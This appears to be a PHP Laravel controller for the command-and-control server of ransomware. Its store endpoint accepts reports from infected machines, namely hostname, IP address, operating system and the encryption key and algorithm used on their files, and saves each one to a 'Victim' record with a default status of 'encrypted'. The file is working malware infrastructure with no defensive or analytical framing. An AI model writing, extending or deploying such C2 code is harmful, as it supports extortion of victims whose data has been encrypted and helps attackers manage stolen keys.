<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\Victim;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;

class C2ReportController extends Controller
{
    public function store(Request $request)
    {
        Log::info('Received C2 report: '.$request->encryption_type);
        Log::info('Received C2 report: '.$request->encryption_key);
        $validated = $request->validate([
            'hostname' => 'required|string',
            'ip_address' => 'required|string',
            'os' => 'nullable|string',
            'encryption_key' => 'required|string',
            'encryption_type' => 'nullable|string',
            'status' => 'nullable|string',
        ]);

        $algoType = strtoupper(trim($validated['encryption_type'] ?? 'AES'));
        Log::info('Determined encryption type: '.$algoType);
        $dataToSave = [
            'ip_address' => $validated['ip_address'],
            'os' => $validated['os'] ?? 'Windows',
            'encryption_type' => $algoType,
            'status' => $validated['status'] ?? 'encrypted',
            'encryption_key' => $validated['encryption_key'],
            'private_key' => null,
        ];

        Victim::updateOrCreate(
            ['hostname' => $validated['hostname']],
            $dataToSave
        );

        return response()->json(['status' => 'success']);
    }
}
